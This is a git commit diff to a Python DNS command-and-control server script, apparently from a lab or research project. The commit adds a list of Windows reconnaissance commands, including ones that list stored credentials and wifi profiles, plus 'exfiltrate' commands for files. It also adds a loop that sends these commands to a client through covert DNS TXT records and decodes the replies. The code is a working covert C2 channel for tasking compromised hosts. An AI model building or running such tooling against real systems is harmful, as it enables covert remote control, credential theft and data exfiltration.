5f7b98c3e9fab784b63502504d115f0725891902
zriback <zacharythecdr@gmail.com>
2025-05-03 06:15:25 -0400

    Added some more commands

--- Zach/manage_dns_c2.py
+++ Zach/manage_dns_c2.py
@@ -3,6 +3,7 @@ import dns.query
 import dns.resolver
 import time
 import base64
+import random
 
 # sleep time between checking response record
 SLEEP_TIME = 1
@@ -17,6 +18,38 @@ RESPONSE_RECORD = 'response.c2.netres.com.'
 
 # must provide the IP address of the DNS server
 DNS_IP = '192.168.243.141'
+
+SAMPLE_COMMANDS = [
+        'whoami',
+        'dir',
+        'systeminfo',
+        'hostname',
+        'ipconfig /all',
+        'netstat -ano',
+        'arp -a',
+        'route print',
+        'net users',
+        'tasklist /v',
+        'wmic startup get caption, command',
+        'sc query state= all',
+        'wmic service list brief',
+        'schtasks /query /fo LIST /v',
+        'set',
+        'exfiltrate message.txt',
+        'exfiltrate data.zip',
+        'echo %USERNAME%',
+        'echo %USERDOMAIN%',
+        'net config workstation',
+        'wmic computersystem get model,name,manufacturer,systemtype',
+        'wmic os get caption,version,osarchitecture',
+        'whoami /all',
+        'netsh wlan show profiles',
+        'wmic logicaldisk get name,description,filesystem,freespace,size',
+        'cmdkey /list',
+        'whoami /priv',
+        'whoami /groups'
+]
+
 
 # update the covert record with the next command we want the client to run
 def update_record(record: str, msg: str) -> str:
@@ -33,7 +66,7 @@ def update_record(record: str, msg: str) -> str:
     return response
 
 
-def main():
+def manual_control():
     resolver = dns.resolver.Resolver()
     resolver.nameservers = [DNS_IP]
 
@@ -64,6 +97,51 @@ def main():
                 break
         else:  #  timeout received
             print('Response timed out from client\n')
+
+
+def automatic_control():
+    resolver = dns.resolver.Resolver()
+    resolver.nameservers = [DNS_IP]
+
+    while True:
+        time.sleep(1)
+        command_index = random.randint(0, len(SAMPLE_COMMANDS)-1)
+        command = SAMPLE_COMMANDS[command_index]
+        print(f'Selected command "{command}"')
+        response = update_record(COMMAND_RECORD, command)
+
+        if "SERVFAIL" in str(response):
+            print('Something went wrong :(')
+            continue
+
+        print('Command set. Waiting for response...')
+        start_time = time.time()
+        while time.time() - start_time < TIMEOUT:
+            time.sleep(SLEEP_TIME)
+            client_response = resolver.resolve(RESPONSE_RECORD, 'TXT')
+            full_client_text = ''
+            for response in client_response:
+                text_response = response.to_text().strip('"')
+                full_client_text += text_response
+            decoded_response = base64.b64decode(full_client_text).decode()
+            
+            if decoded_response != '""':  # client returned a response
+                # reset the field to be empty
+                print(decoded_response, '\n')
+                update_record(RESPONSE_RECORD, '""')
+                update_record(COMMAND_RECORD, '""')
+                break
+        else:  #  timeout received
+            print('Response timed out from client\n')
+
+
+
+
+
+def main():
+    # manual_control()
+    automatic_control()
+  
 
 
 if __name__ == '__main__':
